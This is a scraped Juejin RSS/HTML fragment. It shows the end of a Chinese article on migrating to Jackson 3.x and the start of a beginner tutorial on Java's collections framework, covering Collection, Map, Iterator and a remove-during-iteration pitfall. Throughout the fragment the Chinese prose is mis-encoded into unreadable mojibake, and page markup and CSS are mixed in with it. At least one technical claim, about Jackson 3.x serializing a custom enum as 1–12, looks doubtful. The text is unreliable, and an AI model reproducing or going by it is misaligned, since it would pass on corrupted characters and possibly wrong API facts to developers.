<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Month</span> {
    JANUARY,    <span class="hljs-comment">// 1</span>
    FEBRUARY,   <span class="hljs-comment">// 2</span>
    <span class="hljs-comment">// ... </span>
    DECEMBER    <span class="hljs-comment">// 12</span>
}

<span class="hljs-comment">// Jackson 2.x åºåˆ—åŒ–ç»“æœï¼ˆé»˜è®¤ï¼‰</span>
{<span class="hljs-string">"month"</span>: <span class="hljs-string">"JANUARY"</span>}  <span class="hljs-comment">// æˆ–ä½¿ç”¨ç´¢å¼•ï¼š{"month": 0}</span>

<span class="hljs-comment">// Jackson 3.x åºåˆ—åŒ–ç»“æœï¼ˆé»˜è®¤ï¼‰</span>
{<span class="hljs-string">"month"</span>: <span class="hljs-number">1</span>}  <span class="hljs-comment">// ç›´æ¥ä½¿ç”¨ Month çš„æ•°å€¼ï¼ˆ1-12ï¼‰</span>
</code></pre>
<p><strong>3. æ€§èƒ½ä¼˜åŒ–ç‚¹</strong></p>
<p><strong>å…³é—­æœ«å°¾å­—ç¬¦æ ¡éªŒï¼š</strong> è‹¥è¾“å…¥æ•°æ®å¯ä¿¡ï¼Œå¯ç¦ç”¨Â FAIL_ON_TRAILING_TOKENSÂ å‡å°‘å¼€é”€ï¼š</p>
<pre><code class="hljs language-java" lang="java">JsonMapper.builder().disable(DeserializationFeature.FAIL_ON_TRAILING_TOKENS).build();
</code></pre>
<p><strong>ç¼“å†²åŒºå›æ”¶é…ç½®ï¼š</strong> 3.x é»˜è®¤ä½¿ç”¨åŒç«¯é˜Ÿåˆ—å›æ”¶æ± ï¼Œé«˜å¹¶å‘åœºæ™¯å¯åˆ‡æ¢å› 2.x çš„ ThreadLocal æ± ï¼š</p>
<pre><code class="hljs language-java" lang="java">
<span class="hljs-type">JsonFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> JsonFactory.builder() .recyclerPool(JsonRecyclerPools.threadLocalPool()) .build();
<span class="hljs-type">JsonMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> JsonMapper.builder(factory).build();
</code></pre>
<p><strong>4. å…¼å®¹æ€§é€‚é…</strong></p>
<ul>
<li>è‹¥éœ€ä¿ç•™ 2.x éƒ¨åˆ†é»˜è®¤è¡Œä¸ºï¼Œå¯ä½¿ç”¨Â JsonMapper.builderWithJackson2Defaults()Â å¿«é€Ÿè¿ç§»ï¼ˆä½†æ— æ³•è¦†ç›–æ‰€æœ‰é…ç½®ï¼‰ã€‚</li>
<li>å•å…ƒæµ‹è¯•éœ€é‡ç‚¹æ£€æŸ¥ï¼šå­—æ®µåºåˆ—åŒ–é¡ºåºã€æ—¥æœŸæ ¼å¼ã€æœªçŸ¥å­—æ®µå¤„ç†ã€æšä¸¾åºåˆ—åŒ–æ–¹å¼ç­‰å—é»˜è®¤é…ç½®å˜æ›´å½±å“çš„åœºæ™¯ã€‚</li>
</ul>
<p><strong>5. ç”Ÿæ€æ”¯æŒ</strong></p>
<ul>
<li>Spring å·²åœ¨ 2025.10 ç‰ˆæœ¬æ”¯æŒ Jackson 3.xï¼ˆéœ€å‡çº§ Spring ç›¸å…³ä¾èµ–ï¼‰ã€‚</li>
<li>å¯ä½¿ç”¨ OpenRewrite å·¥å…·è‡ªåŠ¨å®Œæˆéƒ¨åˆ†è¿ç§»ï¼ˆå‚è€ƒï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.openrewrite.org%2Frecipes%2Fjava%2Fjackson%2Fupgradejackson_2_3%25EF%25BC%2589%25E3%2580%2582" target="_blank" title="https://docs.openrewrite.org/recipes/java/jackson/upgradejackson_2_3%EF%BC%89%E3%80%82" ref="nofollow noopener noreferrer">docs.openrewrite.org/recipes/javâ€¦</a></li>
</ul>
<h2 data-id="heading-3">æ€»ç»“</h2>
<p>Jackson 3.x è¿ç§»çš„æ ¸å¿ƒæ˜¯Â <strong>â€œç¯å¢ƒå‡çº§ + ä¾èµ–å˜æ›´ + Builder æ¨¡å¼é€‚é… + åºŸå¼ƒ API æ›¿æ¢â€</strong>ï¼Œå…³é”®åœ¨äºå¤„ç†åŒ…åã€ä¸å¯å˜å¯¹è±¡æ„å»ºå’Œé»˜è®¤é…ç½®å˜æ›´å¸¦æ¥çš„å…¼å®¹æ€§é—®é¢˜ã€‚å»ºè®®å…ˆå‡çº§ JDK 17ï¼Œå†é€šè¿‡ä¾èµ–æ›¿æ¢ã€ä»£ç æ‰¹é‡æ”¹é€ ï¼ˆé‡ç‚¹æ˜¯ ObjectMapper æ„å»ºå’Œå¼‚å¸¸å¤„ç†ï¼‰ã€å•å…ƒæµ‹è¯•éªŒè¯é€æ­¥å®Œæˆè¿ç§»ï¼Œä¼˜å…ˆä½¿ç”¨å®˜æ–¹æä¾›çš„ Builder æ–¹æ³•å’Œå…¼å®¹å·¥å…·å‡å°‘æ‰‹åŠ¨æ”¹é€ æˆæœ¬ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Day26 | Javaé›†åˆæ¡†æ¶æ¦‚è§ˆ]]></title>    <link>https://juejin.cn/post/7581691182004158474</link>    <guid>https://juejin.cn/post/7581691182004158474</guid>    <pubDate>2025-12-10T01:04:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581691182004158474" data-draft-id="7581698074362183689" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Day26 | Javaé›†åˆæ¡†æ¶æ¦‚è§ˆ"/> <meta itemprop="keywords" content="åç«¯,Java,Java EE"/> <meta itemprop="datePublished" content="2025-12-10T01:04:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ‡’æƒ°èœ—ç‰›"/> <meta itemprop="url" content="https://juejin.cn/user/615342556327752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Day26 | Javaé›†åˆæ¡†æ¶æ¦‚è§ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/615342556327752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ‡’æƒ°èœ—ç‰›
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:04:57.000Z" title="Wed Dec 10 2025 01:04:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ç»è¿‡å‰é¢25å¤©çš„å­¦ä¹ ï¼Œæˆ‘ä»¬å·²ç»æ‰“ä¸‹äº†Javaçš„è¯­è¨€åŸºç¡€ã€‚</p>
<p>ä»ä»Šå¤©èµ·ï¼Œæˆ‘ä»¬è¿›å…¥ä¸€ä¸ªå…¨æ–°çš„ã€è‡³å…³é‡è¦çš„é¢†åŸŸâ€”â€”Javaé›†åˆæ¡†æ¶ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ä»€ä¹ˆæ˜¯é›†åˆæ¡†æ¶</h2>
<p>åœ¨æ²¡æœ‰é›†åˆæ¡†æ¶ä¹‹å‰ï¼Œå¦‚æœä½ éœ€è¦å­˜å‚¨ä¸€ç»„å­¦ç”Ÿå¯¹è±¡ï¼Œä½ å¯èƒ½ä¼šä½¿ç”¨æ•°ç»„ã€‚</p>
<p>ä½†æ•°ç»„æœ‰ä¸€ä¸ªè‡´å‘½çš„ç¼ºé™·ï¼šé•¿åº¦ä¸€æ—¦ç¡®å®šï¼Œå°±æ²¡åŠæ³•æ”¹å˜äº†ã€‚</p>
<p>å®šä¹‰çŸ­äº†ï¼Œå¯èƒ½ä¸å¤Ÿç”¨ï¼Œå®šä¹‰é•¿äº†ï¼Œåˆå¯èƒ½é€ æˆèµ„æºæµªè´¹ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ç±»é—®é¢˜ï¼ŒJavaæä¾›äº†ä¸€å¥—æ€§èƒ½ä¼˜è‰¯ã€ä½¿ç”¨æ–¹ä¾¿çš„APIï¼Œç”¨æ¥è¡¨ç¤ºå’Œæ“ä½œå¯¹è±¡çš„é›†åˆã€‚</p>
<p>å¯ä»¥æŠŠå®ƒçœ‹æˆä¸€ä¸ªæ”¶çº³ä¸‡ç‰©çš„"å·¥å…·ç®±"ï¼Œé‡Œé¢æœ‰å„ç§å„æ ·çš„"å®¹å™¨"ï¼ˆæ¯”å¦‚åˆ—è¡¨ã€é›†åˆã€é˜Ÿåˆ—ã€æ˜ å°„è¡¨ç­‰ï¼‰ï¼Œå¯ä»¥é«˜æ•ˆåœ°å¯¹æ•°æ®è¿›è¡Œå¢ã€åˆ ã€æ”¹ã€æŸ¥ç­‰æ“ä½œã€‚</p>
<p>ä¸ºä»€ä¹ˆJavaè¦ç»™æˆ‘ä»¬æä¾›è¿™äº›é›†åˆæ¡†æ¶ï¼Ÿ</p>
<p>å¾ˆå¤šå¤æ‚çš„æ•°æ®ç»“æ„ï¼Œä½ å¦‚é“¾è¡¨ã€å“ˆå¸Œè¡¨ã€çº¢é»‘æ ‘ç­‰ï¼ŒJavaé›†åˆæ¡†æ¶å·²ç»å¸®æˆ‘ä»¬å®ç°å¥½äº†ï¼Œè€Œä¸”ç»è¿‡äº†ä¸€å®šçš„ä¼˜åŒ–ï¼Œä¸å†éœ€è¦æˆ‘ä»¬ä»é›¶å¼€å§‹å®ç°è¿™äº›ç»“æ„ï¼Œæ–¹ä¾¿æˆ‘ä»¬çš„ä½¿ç”¨ã€‚</p>
<p>è¿™äº›æ•°æ®ç»“æ„æ˜¯æˆ‘ä»¬åœ¨æ—¥å¸¸å¼€å‘ä¸­æ¯”è¾ƒå¸¸ä½¿ç”¨çš„ï¼Œé›†åˆæ¡†æ¶éƒ½ç»è¿‡äº†ç²¾å¿ƒè®¾è®¡å’Œä¼˜åŒ–ï¼Œé€šå¸¸æƒ…å†µä¸‹æ¯”æˆ‘ä»¬è‡ªå·±å»ç°å†™çš„è¦é«˜æ•ˆå¾—å¤šã€‚</p>
<p>é›†åˆæ¡†æ¶æä¾›äº†ä¸€å¥—æ ‡å‡†åŒ–çš„æ¥å£ï¼Œä¸ç®¡å…·ä½“çš„å®ç°æ˜¯ä»€ä¹ˆï¼Œæˆ–è€…å‘ç”Ÿä»€ä¹ˆå˜åŒ–ï¼Œæ“ä½œè¿™äº›é›†åˆçš„æ–¹æ³•éƒ½æ˜¯ä¸€è‡´çš„ï¼Œæˆ‘ä»¬åœ¨å­¦ä¹ å’Œä½¿ç”¨çš„æ—¶å€™ï¼Œæˆæœ¬éƒ½æ¯”è¾ƒä½ã€‚</p>
<h2 data-id="heading-1">äºŒã€Javaé›†åˆæ¡†æ¶å›¾è°±</h2>
<p>Javaé›†åˆæ¡†æ¶ä¸»è¦ç”±ä¸¤ä¸ªæ ¸å¿ƒæ¥å£åˆ†æ”¯æ„æˆï¼Œå®ƒä»¬æ˜¯æ‰€æœ‰é›†åˆç±»çš„"è€ç¥–å®—"ï¼š</p>
<h3 data-id="heading-2">2.1 Collection</h3>
<p>ArrayList</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5db3f698026843a1bde16a81be1e2c2f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765933496&amp;x-signature=MzyhOvCyGvVXuufBJltJaLSbjqM%3D" alt="" loading="lazy"/></p>
<p>HashSet</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/34c2de38a7144144ae3c4fb5b2c4af6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765933496&amp;x-signature=Y5FpR%2FH5Q%2F4vUYlDs0poT6qAKTA%3D" alt="" loading="lazy"/></p>
<p>PriorityQueue</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d2b2440929d4d42baf76d11e2a951da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765933496&amp;x-signature=eCopsBRBDA%2Frp52mChntm9Ay8pw%3D" alt="" loading="lazy"/></p>
<p>ä¸Šé¢çš„ArrayListã€HashSetã€PriorityQueueéƒ½å®ç°äº†ä¸€ä¸ªå…±åŒçš„æ¥å£Collectionã€‚</p>
<p>Collectionæ˜¯å­˜æ”¾ç‹¬ç«‹å…ƒç´ çš„é›†åˆçš„æ ¹æ¥å£ã€‚å®ƒçš„ç‰¹ç‚¹å°±æ˜¯ï¼Œå®¹å™¨é‡Œçš„æ¯ä¸ªä½ç½®åªå­˜æ”¾ä¸€ä¸ªå…ƒç´ ã€‚</p>
<p>Collectionæœ‰ä¸‰ä¸ªä¸»è¦çš„å­æ¥å£ï¼šListã€Setã€Queueã€‚</p>
<p>Listæ˜¯ä¸€ä¸ªæœ‰åºçš„é›†åˆï¼Œå…è®¸å­˜æ”¾é‡å¤çš„å…ƒç´ ã€‚ä½ å¯ä»¥åƒæ“ä½œæ•°ç»„ä¸€æ ·é€šè¿‡ç´¢å¼•æ¥è®¿é—®å…ƒç´ ã€‚ï¼ˆä»£è¡¨å®ç°ï¼šArrayList, LinkedListï¼‰</p>
<p>Setæ˜¯ä¸€ä¸ªä¸é‡å¤å…ƒç´ çš„é›†åˆã€‚å®ƒä¸ä¿è¯å…ƒç´ çš„é¡ºåºï¼ˆæŸäº›å®ç°ç±»é™¤å¤–ï¼‰ã€‚ï¼ˆä»£è¡¨å®ç°ï¼šHashSet, TreeSetï¼‰</p>
<p>Queueæ˜¯ä¸€ä¸ªæŒ‰ç‰¹å®šè§„åˆ™ï¼ˆé€šå¸¸æ˜¯å…ˆè¿›å…ˆå‡ºFIFOï¼‰æ¥å¤„ç†å…ƒç´ çš„é›†åˆã€‚ï¼ˆä»£è¡¨å®ç°ï¼šLinkedList, PriorityQueueï¼‰</p>
<h3 data-id="heading-3">2.2 Map</h3>
<p>HashMap</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7395cdac69840e598d400fd6ff2c33c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765933496&amp;x-signature=PV4b4x6Xi3cIxNQFBa9JpsrCOpE%3D" alt="" loading="lazy"/></p>
<p>Mapæ˜¯å­˜æ”¾é”®å€¼å¯¹çš„é›†åˆçš„æ ¹æ¥å£ã€‚</p>
<p>Mapé‡Œçš„æ¯ä¸ªå…ƒç´ éƒ½åŒ…å«ä¸€ä¸ªå”¯ä¸€çš„é”®ï¼ˆKeyï¼‰å’Œä¸€ä¸ªå€¼ï¼ˆValueï¼‰ã€‚</p>
<p>å®ƒä¸ç»§æ‰¿è‡ªCollectionæ¥å£ï¼Œè‡ªæˆä¸€æ´¾ã€‚ï¼ˆä»£è¡¨å®ç°ï¼šHashMap, TreeMapï¼‰</p>
<h2 data-id="heading-4">ä¸‰ã€Collectionçš„æ ¸å¿ƒèƒ½åŠ›</h2>
<p>Collectionæ¥å£å®šä¹‰äº†æ‰€æœ‰å•å…ƒç´ é›†åˆéƒ½å¿…é¡»å…·å¤‡çš„é€šç”¨æ–¹æ³•ã€‚</p>
<p>æŒæ¡äº†å®ƒï¼Œä½ å°±æŒæ¡äº†æ“ä½œListã€Setã€Queueçš„ä¸€åŠäº†ã€‚</p>
<p>ä¸€èµ·ç®€å•çš„æ¢³ç†ä¸‹Collectionä¸­å®šä¹‰çš„å±æ€§å’Œè¡Œä¸ºï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Collection</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Iterable</span>&lt;E&gt; {
<span class="hljs-comment">// é›†åˆé‡Œè£…çš„å…ƒç´ ä¸ªæ•°</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span>;

<span class="hljs-comment">// é›†åˆæ˜¯ä¸æ˜¯ç©ºçš„</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">isEmpty</span><span class="hljs-params">()</span>;

<span class="hljs-comment">// é›†åˆé‡Œæ˜¯ä¸æ˜¯åŒ…å«æŸä¸ªå¯¹è±¡</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">contains</span><span class="hljs-params">(Object o)</span>;

<span class="hljs-comment">// è¿”å›ä¸€ä¸ªç”¨æ¥éå†é›†åˆçš„è¿­ä»£å™¨</span>
Iterator&lt;E&gt; <span class="hljs-title function_">iterator</span><span class="hljs-params">()</span>;

<span class="hljs-comment">// æŠŠé›†åˆè½¬æ¢æˆä¸€ä¸ªObjectæ•°ç»„</span>
Object[] toArray();

<span class="hljs-comment">// æŠŠé›†åˆè½¬æ¢æˆä¸€ä¸ªæŒ‡å®šç±»å‹çš„æ•°ç»„</span>
&lt;T&gt; T[] toArray(T[] a);

<span class="hljs-comment">// æ·»åŠ ä¸€ä¸ªå…ƒç´ åˆ°é›†åˆé‡Œ</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">add</span><span class="hljs-params">(E e)</span>;

<span class="hljs-comment">// ä»é›†åˆé‡Œç§»é™¤ä¸€ä¸ªå…ƒç´ </span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">remove</span><span class="hljs-params">(Object o)</span>;

<span class="hljs-comment">// æŠŠå¦ä¸€ä¸ªé›†åˆçš„æ‰€æœ‰å…ƒç´ éƒ½æ·»åŠ åˆ°è¿™ä¸ªé›†åˆ</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">addAll</span><span class="hljs-params">(Collection&lt;? extends E&gt; c)</span>;

<span class="hljs-comment">// ç§»é™¤é›†åˆé‡Œä¹Ÿå­˜åœ¨äºå¦ä¸€ä¸ªé›†åˆä¸­çš„æ‰€æœ‰å…ƒç´ </span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">removeAll</span><span class="hljs-params">(Collection&lt;?&gt; c)</span>;

<span class="hljs-comment">// æ¸…ç©ºé›†åˆé‡Œçš„æ‰€æœ‰å…ƒç´ </span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span>;
}
</code></pre>
<blockquote>
<p>Collectioné‡Œçš„Eå°±æ˜¯æˆ‘ä»¬ä¹‹å‰å­¦ä¹ çš„æ³›å‹ï¼Œè¡¨ç¤ºå…ƒç´ çš„ç±»å‹ã€‚</p>
</blockquote>
<h2 data-id="heading-5">å››ã€Iterableå’ŒIterator</h2>
<p>ä½ å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼ŒCollectionæ¥å£ç»§æ‰¿äº†ä¸€ä¸ªIterableæ¥å£ã€‚</p>
<p>Iterableæ¥å£å…¶å®æ˜¯Java 5å¼•å…¥çš„ï¼Œå®ƒè®©å®ç°äº†è¿™ä¸ªæ¥å£çš„é›†åˆéƒ½å…·å¤‡äº†ä½¿ç”¨for-eachå¾ªç¯çš„èƒ½åŠ›ã€‚</p>
<blockquote>
<p>æˆ‘ä»¬åœ¨çœ‹ç»§æ‰¿å…³ç³»çš„æ—¶å€™ï¼Œçœ‹åˆ°ableç»“å°¾çš„æ¥å£ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ä¸‹å°±å¯ä»¥ç†è§£æˆï¼Œè®©å­ç±»å…·æœ‰æŸé¡¹èƒ½åŠ›ã€‚</p>
</blockquote>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Iterable</span>&lt;E&gt; {
    Iterator&lt;E&gt; <span class="hljs-title function_">iterator</span><span class="hljs-params">()</span>;
}
</code></pre>
<p>Iteratorï¼ˆè¿­ä»£å™¨ï¼‰ å¯ä»¥çœ‹æˆçœŸæ­£è´Ÿè´£éå†çš„æŒ‡é’ˆã€‚</p>
<p>ç±»ä¼¼ä¸€ä¸ªæ¸¸æ ‡ï¼Œåœ¨é›†åˆä¸Šç§»åŠ¨ï¼Œå¹¶æä¾›äº†å®‰å…¨åœ°è®¿é—®å’Œåˆ é™¤å…ƒç´ çš„æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Iterator</span>&lt;E&gt; {
<span class="hljs-comment">// åˆ¤æ–­é›†åˆé‡Œæ˜¯ä¸æ˜¯è¿˜æœ‰ä¸‹ä¸€ä¸ªå…ƒç´ å¯ä»¥è®¿é—®ã€‚</span>
<span class="hljs-type">boolean</span> <span class="hljs-title function_">hasNext</span><span class="hljs-params">()</span>;

<span class="hljs-comment">// è¿”å›é›†åˆé‡Œçš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶å°†"æŒ‡é’ˆ"åç§»ä¸€ä½ã€‚</span>
E <span class="hljs-title function_">next</span><span class="hljs-params">()</span>;

}
</code></pre>
<p>æåˆ°åˆ é™¤å…ƒç´ ï¼Œæˆ‘ä»¬åœ¨åˆå­¦çš„æ—¶å€™ï¼Œè¿˜ä¼šé‡åˆ°ä¸€ä¸ªå‘ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day26;

<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Day26Demo
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/6/23 13:42
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Day26Demo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
        list.add(<span class="hljs-string">"æ‡’æƒ°"</span>);
        list.add(<span class="hljs-string">"èœ—ç‰›"</span>);
        list.add(<span class="hljs-string">"Java"</span>);

        <span class="hljs-keyword">for</span> (String str : list) {
            <span class="hljs-keyword">if</span> (<span class="hljs-string">"æ‡’æƒ°"</span>.equals(str)) {
                list.remove(str);
            }
        }
    }
}
</code></pre>
<p>åœ¨è°ƒç”¨list.remove()çš„æ—¶å€™ï¼ŒArrayListçš„å†…éƒ¨ç»“æ„å‘ç”Ÿäº†å˜åŒ–ï¼ˆå…ƒç´ æ•°é‡ã€ç´¢å¼•ç­‰ï¼‰ï¼Œä½†è¿­ä»£å™¨Iteratorå¹¶ä¸çŸ¥é“è¿™ä¸ªå˜åŒ–ã€‚</p>
